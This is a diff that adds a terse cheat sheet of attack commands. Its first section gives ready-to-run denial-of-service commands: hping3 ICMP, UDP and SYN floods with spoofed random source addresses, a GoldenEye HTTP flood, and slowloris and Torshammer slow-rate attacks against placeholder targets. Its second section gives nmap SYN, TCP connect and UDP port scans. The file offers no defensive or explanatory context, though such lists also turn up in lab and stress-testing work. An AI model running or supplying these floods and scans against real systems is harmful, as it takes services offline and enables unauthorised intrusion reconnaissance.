@@ -1,0 +1,31 @@
+DOS ATTACKS
+
+# ICMP flood
+hping3 --flood --rand-source -1 -p <Targeted port/Range of ports> <Target IP address>
+
+# UDP flood
+hping3 --flood --rand-source --udp -p <Targeted port/range of ports> <Target IP address>
+
+# SYN flood
+hping3 -S -p <Targeted port/range of ports> --flood --rand-source <Target IP address>
+
+# HTTP flood
+python3 ./goldeneye.py http://<Target IP address of the web server>
+
+# Slowrate DoS python script
+python3 slowloris.py <Target IP address of the web server>
+
+# Slowrate DoS Torshammer script
+python2 torshammer.py -t <Target IP address of the web server>
+
+
+PORT SCANS
+
+# SYN scan
+nmap -sS <Target IP address> -p <Targeted port/range of ports>
+
+# TCP Connect scan
+nmap -sT <Target IP address> -p <Targeted port/range of ports>
+
+# UDP scan
+nmap -sU <Target IP address> -p <Targeted port/range of ports>
